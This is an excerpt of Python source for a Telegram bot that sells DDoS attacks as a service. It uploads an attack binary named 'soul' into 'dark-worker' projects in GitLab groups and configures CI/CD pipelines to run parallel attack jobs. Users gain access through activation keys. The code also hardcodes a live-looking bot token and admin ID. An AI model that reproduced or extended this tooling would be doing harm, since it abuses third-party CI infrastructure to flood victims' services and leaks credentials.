...
BOT_TOKEN = "8743662415:AAGnsPXSk6ZN0xUOImQXT4UjWtfC_4Q5icg"
YML_FILE_PATH = ".gitlab-ci.yml"
BINARY_FILE_NAME = "soul"
ATTACK_HISTORY_FILE = "attack_history.json"
ADMIN_IDS = [1725783398]
TARGET_PROJECT_NAME = "dark-worker"  # NEW: Name of project to auto-create
...
def find_or_create_project_in_group(token, group_id, project_name=TARGET_PROJECT_NAME):
    ...
    Args:
        ...
        project_name: Name of project to find or create (default: dark-worker)
...
def get_target_project_from_group(token, group_id, preferred_name="Lumen"):
    """
    Get target project from a group. Looks for preferred name first, then dark-worker, then first available.
    ...
    try:
        ...
        # Priority 2: Look for "dark-worker"
        for project in projects:
...
def setup_group_automatically(token, group_id, binary_content=None):
    """
    Automatically setup a group with dark-worker project, binary, and CI/CD.
    ...
    """
    try:
        # Step 1: Find or create dark-worker project
...
run_single_attack:
  stage: first_batch
  parallel: 5  # Set to 1 to run only one job
...
async def quick_launch_start(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id):
    if not can_user_attack(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED!\n• You are not authorised to use this bot.\n• Activate your key or contact Admin or Owner.")
        return
...
async def upload_token_file_start(update: Update, user_id):
    ...
    await update.message.reply_text(
        ...
        "• Find or create 'dark-worker' project\n"
        "• Upload binary file\n"
        "• Setup CI/CD configuration\n\n"
...
async def help_handler(update: Update, user_id):
    if is_owner(user_id) or is_admin(user_id):
        ...
        message = (
            ...
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "• Launch Attack - Start DDoS attack\n"
            "• Attack Launch - Start attack in one line\n"
            "• Check Status - View attack status\n"
